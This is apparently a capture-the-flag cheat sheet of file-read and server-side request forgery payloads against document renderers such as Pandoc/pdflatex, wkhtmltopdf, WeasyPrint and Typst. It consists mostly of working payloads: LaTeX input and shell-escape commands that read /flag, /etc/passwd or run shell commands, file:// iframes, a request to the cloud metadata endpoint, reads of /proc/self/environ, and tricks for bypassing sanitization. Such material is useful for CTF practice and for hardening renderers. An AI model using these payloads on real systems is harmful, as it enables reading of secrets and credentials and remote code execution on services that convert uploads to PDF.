# Document-renderer LFI / SSRF cheat sheet
(Pandoc/pdflatex, Typst, WeasyPrint, wkhtmltopdf - "upload markdown/html -> get PDF" is a recurring CSCV pattern.)

## 1. Recon first
- Check response headers / error pages for the renderer name + version.
- Try a harmless macro first (`\today`, `{{7*7}}`, a raw `<script>`) to see if/how input is sanitized before going further.

## Pandoc -> pdflatex (raw LaTeX passthrough is the classic bug)
```markdown
\input{/flag}
\input{/etc/passwd}
```
Alt (if `\input` stripped):
```latex
\newread\file \openin\file=/flag \read\file to\line \line
```
Alt file-read via `\immediate\write18` (shell-escape, if enabled - much stronger, gives RCE):
```latex
\immediate\write18{cat /flag > /tmp/out.txt}
\input{/tmp/out.txt}
```
Graphics-based read (binary-safe-ish):
```latex
\usepackage{graphicx}\includegraphics{/flag}
```

## wkhtmltopdf (uses old Qt WebKit - SSRF/LFI via file:// and JS)
```html
<iframe src="file:///etc/passwd"></iframe>
<iframe src="file:///flag" width="1000" height="1000"></iframe>
<img src="file:///flag">
```
SSRF to cloud metadata if hosted:
```html
<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
```

## WeasyPrint (HTML/CSS -> PDF)
```html
<link rel="attachment" href="file:///flag">
<img src="file:///flag">
```
CSS `url()` SSRF/LFI:
```css
background: url(file:///flag);
```

## Typst
```typ
#include "/flag"
#read("/flag")
```

## General
- If direct `/flag` path unknown, try `/flag`, `/flag.txt`, `/app/flag`, `/root/flag`, env var dump (`\usepackage{xkeyval}\getenv` or similar), or read `/proc/self/environ`, `/proc/1/cmdline`.
- If output is sanitized/escaped, try double encoding, null-byte tricks, or splitting the macro across allowed markdown constructs (e.g. raw-LaTeX passthrough blocks: `` ```{=latex} `` fenced blocks in pandoc markdown).
- Always check `/flag` readability isn't blocked by AppArmor/seccomp in the container - if LFI returns empty, pivot to write18/RCE if shell-escape is on.
